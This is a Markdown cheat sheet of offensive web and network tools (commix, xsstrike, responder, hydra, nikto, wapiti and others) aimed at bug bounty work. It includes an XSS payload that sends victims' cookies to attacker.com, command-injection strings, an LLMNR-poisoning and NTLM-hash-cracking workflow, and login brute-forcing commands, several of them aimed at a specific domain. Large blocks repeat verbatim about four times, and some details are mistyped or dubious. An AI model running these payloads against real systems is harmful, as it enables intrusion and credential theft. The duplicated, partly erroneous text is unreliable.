# Scan HTTPS with cookies
dirb https://target.com /usr/share/wordlists/dirb/common.txt -c "PHPSESSID=xxx"

# Quiet mode (less output)
dirb http://target.com -w
```

**Common Wordlists**:
- `/usr/share/wordlists/dirb/common.txt` - General directories
- `/usr/share/wordlists/dirb/big.txt` - Larger wordlist
- `/usr/share/wordlists/dirb/small.txt` - Minimal wordlist

**Tips**:
- Use after ffuf for complementary coverage
- Check for `.git/`, `.env`, `config/` directories
- Look for admin panels, backup files, legacy endpoints

---

### gobuster - Multi-Purpose Fuzzer
**Location**: `/usr/bin/gobuster`
**Purpose**: Directory, DNS, VHost, and fuzzing enumeration

**Use Cases**:
```bash
# Directory fuzzing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,js

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# VHost discovery (find virtual hosts on same IP)
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt

# Fuzzing mode (replace FUZZ keyword)
gobuster fuzz -u http://target.com/api/FUZZ -w parameter-wordlist.txt

# With threading (faster)
gobuster dir -u http://target.com -w wordlist.txt -t 50

# Output to file
gobuster dir -u http://target.com -w wordlist.txt -o results.txt
```

**Wordlists**:
- SecLists: `/usr/share/seclists/Discovery/Web-Content/`
- Kanan: `/usr/share/wordlists/kanak`

**Tips**:
- DNS mode is great for subdomain takeover testing
- VHost mode can reveal internal-only subdomains
- Use `-t 50-100` for faster enumeration

---

### commix - Command Injection Scanner
**Location**: `/usr/bin/commix`
**Purpose**: Automated detection and exploitation of command injection vulnerabilities

**Use Cases**:
```bash
# Basic scan
commix --url="http://target.com/vuln?q=1"

# POST data
commix --url="http://target.com/vuln" --data="q=1"

# With cookies
commix --url="http://target.com/vuln?q=1" --cookie="PHPSESSID=xxx"

# Specific parameter
commix --url="http://target.com/vuln" --data="q=1" -p q

# Check all parameters
commix --url="http://target.com/vuln" --all

# Blind command injection (time-based)
commix --url="http://target.com/vuln?q=1" --level=3

# OS shell (if injectable)
commix --url="http://target.com/vuln?q=1" --os-shell

# Try different injection points
commix --url="http://target.com/vuln" --data="q=1" --prefix="; " --suffix=" #"

# Verbose output
commix --url="http://target.com/vuln?q=1" -v
```

**Injection Techniques**:
- Unix: `;whoami`, `|whoami`, `$(whoami)`, `` `whoami` ``
- Windows: `&whoami`, `|whoami`, `;whoami`
- Blind: `sleep 5`, `ping -c 5 127.0.0.1`

**Tips**:
- Always test with simple commands first (`id`, `whoami`)
- Check HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Test in cookie values, JSON bodies, XML inputs

---

### xsstrike - Advanced XSS Scanner
**Location**: `/usr/bin/xsstrike`
**Purpose**: Detect and exploit cross-site scripting vulnerabilities

**Use Cases**:
```bash
# Basic scan
xsstrike -u "http://target.com/vuln?q=test"

# POST request
xsstrike -u "http://target.com/vuln" --data "q=test"

# Crawl and scan
xsstrike -u "http://target.com/" --crawl

# With cookies
xsstrike -u "http://target.com/vuln?q=test" --cookie "PHPSESSID=xxx"

# Skip confirmation (for automation)
xsstrike -u "http://target.com/vuln?q=test" --skip

# Blind XSS (with callback)
xsstrike -u "http://target.com/vuln?q=test" --blind --payload "><script>document.location='http://attacker.com/?c='+document.cookie</script>"

# Find reflected parameters
xsstrike -u "http://target.com/page" --params

# Fuzzing mode
xsstrike -u "http://target.com/vuln" --fuzzer
```

**Advanced Options**:
- `--level` - Testing depth (1-3)
- `--encode` - Payload encoding (base64, url, hex)
- `--payloads` - Custom payload file

**Tips**:
- Check all input points: GET, POST, headers, cookies
- Look for DOM-based XSS (use browser tools)
- Test in JSON, XML, multipart forms

---

### responder - LLMNR/NBT-NS Poisoner
**Location**: `/usr/bin/responder`
**Purpose**: Intercept network authentication requests for credential harvesting

**Use Cases**:
```bash
# Basic run (listen on all interfaces)
responder -I eth0

# Specify interface
responder -I wlan0

# Verbose mode
responder -I eth0 -v

# Analyze mode (don't poison, just listen)
responder -I eth0 -A

# Disable specific protocols
responder -I eth0 --Disable-httpoxy

# With specific IP range
responder -I eth0 -r 192.168.1.0-192.168.1.255

# Log to file
responder -I eth0 -o /tmp/responder.log

# Challenge/Response mode (for hash cracking)
responder -I eth0 --lm --ntlm
```

**What It Captures**:
- LLMNR requests (when DNS fails)
- NBT-NS requests (NetBIOS)
- MDNS requests
- HTTP Basic/NTLM Auth
- WPAD requests

**Workflow After Capture**:
1. Run responder to poison LLMNR/NBT-NS
2. Wait for user to type wrong password or access file share
3. Capture NTLM hash
4. Crack with hashcat: `hashcat -m 5600 hash.txt wordlist.txt`

**Tips**:
- Works best on internal networks (not bug bounty)
- Essential for Active Directory assessments
- Use `multirelay.py` for SMB relay attacks

---

### hydra - Password Brute Forcer
**Location**: `/usr/bin/hydra`
**Purpose**: Parallelized login brute forcing for various protocols

**Use Cases**:
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt target.com ssh

# HTTP POST login
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt target.com http-get:/protected/

# FTP
hydra -L users.txt -P passwords.txt target.com ftp

# SMB
hydra -L users.txt -P passwords.txt target.com smb

# Web login (custom failure message)
hydra target.com http-form-post "/login:user=^USER^&pass=^PASS^:Invalid user" -L users.txt -P passwords.txt

# Concurrent connections
hydra -L users.txt -P passwords.txt target.com ssh -t 4

# Single username, multiple passwords
hydra -l admin -P passwords.txt target.com ssh

# Output results
hydra -L users.txt -P passwords.txt target.com ssh -o results.txt
```

**HTTP Form Format**:
```
hydra target.com http-post-form "/path:username=^USER^&password=^PASS^:Invalid user"
```
- `F=` = Failure message to detect
- `S=` = Success message (optional)
- `C=` = Continue on success (optional)

**Protocols Supported**:
- SSH, FTP, Telnet, SMTP, HTTP, HTTPS
- LDAP, SMB, RDP, VNC, MySQL, PostgreSQL
- Cisco, Juniper, Palo Alto

**Tips**:
- Use `-t` to limit threads (avoid account lockout)
- Start with common credentials (rockyou.txt)
- Test passwords before usernames (often rate-limited)

---

### exiftool - Metadata Extractor
**Location**: `/usr/bin/exiftool`
**Purpose**: Read, write, and edit metadata in files

**Use Cases**:
```bash
# Read all metadata
exiftool image.jpg

# Read specific tags
exiftool -Make -Model -DateTimeOriginal image.jpg

# Extract GPS coordinates
exiftool -GPS* image.jpg

# List all available tags
exiftool -s image.jpg

# Extract to JSON
exiftool -json image.jpg

# Batch process directory
exiftool -r directory/

# Find author/creator
exiftool -Author -Creator -Artist image.jpg

# Check software used
exiftool -Software image.jpg

# Export specific fields to CSV
exiftool -r -csv /path/to/images > metadata.csv

# Remove all metadata
exiftool -all= image.jpg

# Copy metadata between files
exiftool -TagsFromFile source.jpg -all destination.jpg
```

**Useful Tags for Bug Bounty**:
- `Software` - Editing software (Photoshop, etc.)
- `Author`, `Creator` - Who created the file
- `GPSPosition` - Location data
- `DateTimeOriginal` - Creation date
- `Make`, `Model` - Device info
- `UserComment` - Hidden user notes
- `XPComment` - Windows comment field

**Tips**:
- Check for hidden data in images
- Look for steganographed credentials in user uploads
- Use `steghide info` first to see if file has embedded data
- Default steghide encoding is weak - try other tools if it fails

**Other Stego Tools**:
- `zsteg` - PNG/BMP analysis
- `stegsolve` - Visual analysis
- `outguess` - OutGuess steganography
- `snow` - Whitespace steganography

---

### steghide - Steganography Tool
**Location**: `/usr/bin/steghide`
**Purpose**: Hide data in images/audio, or extract hidden data

**Use Cases**:
```bash
# Extract hidden data from image
steghide extract -sf image.jpg

# Extract to specific file
steghide extract -sf image.jpg -xf output.txt

# Hide data in image
steghide embed -cf image.jpg -ef secret.txt

# Hide with encryption
steghide embed -cf image.jpg -ef secret.txt -p mypassword

# Display info about steganographed file
steghide info image.jpg

# Encode with specific algorithm
steghide embed -cf image.jpg -ef secret.txt -e aes-256-cbc

# Supported algorithms:
# steghide: default (JSteg)
# aes-128, aes-192, aes-256
# cast-128, cast-256
# idea, rijndael-256, serpent, twofish, etc.
```

**Supported Formats**:
- Input: JPEG, BMP, WAV, AU
- Output: JPEG, BMP, WAV, AU

**Brute Force Password**:
```bash
# With stegcracker (if installed)
stegcracker image.jpg wordlist.txt

# Manual approach
while read pass; do
  steghide extract -sf image.jpg -p "$pass" -xf out.txt 2>/dev/null && echo "Found: $pass" && break
done < wordlist.txt
```

**Tips for Bug Bounty**:
- Check images for hidden data (CTF-style challenges)
- Look for steganographed credentials in user uploads
- Use `steghide info` first to see if file has embedded data
- Default steghide encoding is weak - try other tools if it fails

**Other Stego Tools**:
- `zsteg` - PNG/BMP analysis
- `stegsolve` - Visual analysis
- `outguess` - OutGuess steganography
- `snow` - Whitespace steganography

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
